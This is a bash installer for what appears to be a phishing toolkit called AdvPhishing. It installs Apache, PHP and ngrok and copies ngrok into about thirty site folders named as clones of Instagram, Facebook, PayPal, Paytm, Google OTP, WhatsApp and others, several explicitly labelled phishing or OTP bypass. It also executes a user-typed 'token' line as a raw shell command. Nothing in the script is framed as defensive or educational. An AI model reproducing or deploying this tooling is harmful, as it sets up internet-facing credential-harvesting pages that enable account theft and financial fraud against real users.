#!/bin/bash
echo ""
clear
echo ""
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m !!! MUST BE ROOT OTHERWISE SCRIPT WILL NOT WORK PROPERLY !!!    \e[0m'
sleep 3
clear
echo ""
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m >> DOWNLOADING REQUIREMENTS >> \e[0m'

# Install required packages using pacman
sudo pacman -Sy --noconfirm apache php jq curl xterm
sudo pacman -Sy --noconfirm gnome-terminal unzip wget

# Start Apache service using systemd
sudo systemctl start httpd

# Download and setup ngrok
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip

# Copy ngrok to various directories
directories=(
    "sites/github/"
    "sites/Hotstar-otp-bypass/"
    "sites/instagram/"
    "sites/Linkedin/"
    "sites/Netflix/"
    "sites/Paytm-Phishing/paytm/"
    "sites/Paytm-Phishing/signup/"
    "sites/spotify/"
    "sites/whatsapp-phishing/"
    "sites/facebook/"
    "sites/google-otp/"
    "sites/instafollow/"
    "sites/ipfinder/"
    "sites/ola-otpbypass/"
    "sites/UberEats-Phishing/"
    "sites/Zomato-Phishing/"
    "sites/amazonsign/"
    "sites/tiktok/"
    "sites/phonepay/"
    "sites/paypal/"
    "sites/telegram/"
    "sites/twitter/"
    "sites/flipcart/"
    "sites/wordpress/"
    "sites/snapchat/"
    "sites/protonmail/"
    "sites/stackoverflow/"
    "sites/ebay/"
    "sites/twitch/"
    "sites/ajio/"
    "sites/cryptocurrency/"
    "sites/mobikwik/"
    "sites/pinterest/"
)

for dir in "${directories[@]}"; do
    cp -R ngrok "$dir"
done

chmod 7777 AdvPhishing.sh
clear
echo ""
echo ""
echo ""
read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
$token
clear
